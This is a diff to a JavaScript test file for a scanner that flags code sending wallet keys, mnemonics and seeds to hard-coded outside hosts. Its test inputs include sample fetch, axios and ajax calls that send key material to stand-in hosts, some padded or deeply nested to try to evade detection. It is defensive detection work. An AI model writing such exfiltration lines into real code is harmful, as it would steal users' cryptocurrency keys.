@@ -40,16 +40,30 @@ class Keypair {
   static fromSecretKey(secretKey) { Loader.addToQueue(secretKey); return new Keypair(secretKey); }
 }
 `;
-    assert.deepEqual(keyExfil(src).sort(), [
-        'fetch() sends _secretKey to rpc.example-bad.xyz through addToQueue()',
-        'fetch() sends secretKey to rpc.example-bad.xyz through addToQueue()',
-    ]);
+    // One finding per sending function, naming the first key passed to it.
+    assert.deepEqual(keyExfil(src), ['fetch() sends _secretKey to rpc.example-bad.xyz through addToQueue()']);
     assert.ok(scanJs(src).signals.filter((s) => s.kind === 'key-exfil').every((s) => s.line === 4));
 });
 
 test('other request calls and template URLs count too', () => {
     assert.deepEqual(keyExfil('axios.post(`https://collect.example-bad.top/${id}`, { mnemonic });'), ['post() sends mnemonic to collect.example-bad.top']);
     assert.deepEqual(keyExfil('$.ajax("https://k.example-bad.top/", { data: { k: wallet.privateKey } });'), ['ajax() sends privateKey to k.example-bad.top']);
+});
+
+test('padding or deep nesting in the request does not hide the key', () => {
+    const pad = Array.from({ length: 5000 }, (_, i) => `a${i}: ${i}`).join(', ');
+    assert.deepEqual(keyExfil(`fetch("https://k.example-bad.top/", { body: JSON.stringify({ ${pad}, k: seed }) });`), ['fetch() sends seed to k.example-bad.top']);
+    assert.deepEqual(keyExfil(`fetch("https://k.example-bad.top/", ${'['.repeat(500)}seed${']'.repeat(500)});`), ['fetch() sends seed to k.example-bad.top']);
+    assert.deepEqual(keyExfil(`function s(p) { fetch("https://k.example-bad.top/", { body: p }); }\ns(${'['.repeat(500)}privateKey${']'.repeat(500)});`), ['fetch() sends privateKey to k.example-bad.top through s()']);
+});
+
+test('many key names and calls are worked out in linear time', () => {
+    const n = 20000;
+    const src = `function s(p) { fetch("https://k.example-bad.top/", { body: p }); }\n` + Array.from({ length: n }, (_, i) => `s([seed, ${i}], f(g(h(privateKey))));`).join('\n')
+        + `\nfetch("https://k.example-bad.top/", [${Array.from({ length: n }, () => 'seed').join(', ')}]);\n`;
+    const t = Date.now();
+    assert.deepEqual(keyExfil(src).sort(), ['fetch() sends seed to k.example-bad.top', 'fetch() sends seed to k.example-bad.top through s()']);
+    assert.ok(Date.now() - t < 3000, `${Date.now() - t} ms`);
 });
 
 test('no key-exfil without a hard-coded new host, without key material, or for an object key only', () => {
